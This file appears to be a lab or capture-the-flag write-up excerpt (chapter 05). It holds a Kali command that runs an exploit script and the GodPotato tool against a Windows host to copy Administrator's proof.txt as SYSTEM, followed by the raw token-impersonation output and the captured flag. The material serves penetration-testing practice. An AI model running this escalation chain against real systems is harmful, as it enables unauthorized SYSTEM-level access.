@@ -1,0 +1,43 @@
+# On Kali — the escalation that reads proof.txt as SYSTEM (chapter 05)
+#
+# cd ~/Desktop/Exploit && python3 1.py 192.168.137.151 "C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd \"cmd /c copy /y C:\Users\Administrator\Desktop\proof.txt C:\Users\chris\AppData\Local\Temp\proof_out.txt\"" ; echo "=== now reading as chris ===" ; sleep 2 ; python3 1.py 192.168.137.151 "type C:\Users\chris\AppData\Local\Temp\proof_out.txt 2>&1"
+#
+# Raw output:
+
+Authenticated
+Content-Type: api/response
+Content-Length: 966
+
+[*] CombaseModule: 0x140735549669376
+[*] DispatchTable: 0x140735552120248
+[*] UseProtseqFunction: 0x140735551452272
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] StartPipeServer
+[*] CreateNamedPipe \\.\pipe\3b1b71a1-c843-4f35-8e93-35e0449f3123\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00008c02-0c20-ffff-323f-a86a0559d432
+[*] DCOM obj OXID: 0x90badc438e744dbe
+[*] DCOM obj OID: 0x92662114439d02d6
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 1000 Token:0x776  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 6856
+        1 file(s) copied.
+
+=== now reading as chris ===
+Authenticated
+Content-Type: api/response
+Content-Length: 33
+
+46586fc8f483adc13d76335768bf0a4c
